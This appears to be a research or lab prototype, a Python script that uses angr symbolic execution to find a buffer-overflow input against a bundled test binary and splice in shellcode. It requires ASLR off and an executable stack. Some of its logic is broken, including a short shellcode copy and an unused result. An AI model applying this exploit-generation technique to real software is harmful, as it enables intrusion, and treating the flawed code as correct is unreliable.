#!/usr/bin/env python3
import subprocess
import os
import sys
import angr
import claripy

def load_shellcode(file_path):
    '''
    Load shellcode, if not found, it will run make on the directory containing
    the shellcode. Make will also build the target binary for testing.
    '''
    if not os.path.isfile(file_path):
        subprocess.call("make clean", cwd=os.path.dirname(file_path), shell=True)
    subprocess.call("make", cwd=os.path.dirname(file_path), shell=True)
    file = open(file_path, 'rb')
    shellcode = file.read()
    print(shellcode)
    return shellcode

def scan_target():
    rbp_addr = 0x0
    buffer_addr = 0x0
    file_path = "../tests/resources/simple_buffer.o"
    if not os.path.isfile(file_path):
        subprocess.call("make clean", cwd=os.path.dirname(file_path), shell=True)
        subprocess.call("make", cwd=os.path.dirname(file_path), shell=True)
    project = angr.Project(file_path,\
            load_options={'auto_load_libs':False})

    print("Architecture: " + project.arch.name + " Starting at address:  " + hex(project.entry))
    print("Endianness: " + project.arch.memory_endness)

    assert project.loader.aslr == False, "ASLR is enabled, analysis is not possible"
    assert project.loader.main_object.execstack == True, "Stack is not executable"
    assert project.loader.main_object.pic == False, "Position Independant Code\
    enabled"

    entry_block = project.factory.block(project.entry)
    entry_block.pp()
    cfg = project.analyses.CFG()

    def get_func_addr( func_name, plt=None ):
            found = [
                addr for addr,func in cfg.kb.functions.items()
                if func_name == func.name and (plt is None or func.is_plt == plt)
                ]
            if len( found ) > 0:
                print("Found "+func_name+"'s address at "+hex(found[0])+"!")
                return found[0]
            else:
                raise Exception("No address found for function : "+func_name)

    exit_addr = get_func_addr("exit")
    strcpy_addr = get_func_addr("strcpy")
    argv = [project.filename]

    sym_arg_size = 200

    sym_arg = claripy.BVS('sym_arg', 8 * sym_arg_size)
    argv.append(sym_arg)
    argv.append("Found the canary!")

    state = project.factory.entry_state(args=argv)

    sm = project.factory.simulation_manager(state)

    def find_strcpy(state):
        if(state.ip.args[0] == strcpy_addr):
            print("Strcpy found during simulation!")
            print("BV RBP address at: ", state.memory.load(state.regs.rbp))
            rbp_addr = state.solver.eval(state.memory.load(state.regs.rbp, 8), cast_to=int)
            print("RBP address at: ", rbp_addr)
            bv_strcpy_mem = state.memory.load(state.regs.rsi, len(argv[1]))
            strcpy_src = state.solver.eval(bv_strcpy_mem, cast_to=bytes)
            return True if argv[2].encode() in strcpy_src else False
        else:
            return False

    sm = sm.explore(find=find_strcpy, avoid=(exit_addr,))
    found = sm.found
    result = ""
    if len(found) > 0:
        found = sm.found[0]
        result = found.solver.eval(argv[1], cast_to=bytes)
    else:
        result = "ERROR: Could not find any paths!"
    return result


def find_index_of_buffer(exploit_str, length):
    """
    Find index of first location in buffer that has a sequence of
    bytes with empty null characters of length
    """
    counter = 0
    ret_index = -1
    for (i, byte) in enumerate(exploit_str):
        if byte != 0x00:
            counter = 0
            continue
        if counter == 0:
            ret_index = i
        counter += 1
        if counter == length:
            return ret_index
    return -1



def append_shellcode(exploit_str):
    ret_str = bytearray() 
    shellcode = load_shellcode("../tests/resources/shellcode_encoding")
    index = find_index_of_buffer(exploit_str, len(shellcode))
    if index == -1:
        print("Error: Could not find space for shellcode!")
        sys.exit()
    count = 0
    for i in range(0, len(exploit_str)):
        if i > index and i < index + len(shellcode):
            ret_str.append(shellcode[count])
            count += 1
        else:
            ret_str.append(exploit_str[i])
    return (ret_str, index)

def generate_exploit():
    control_flow_hijack_str = scan_target()
    payload_with_shellcode = append_shellcode(control_flow_hijack_str)
    

if __name__ == "__main__":
    generate_exploit()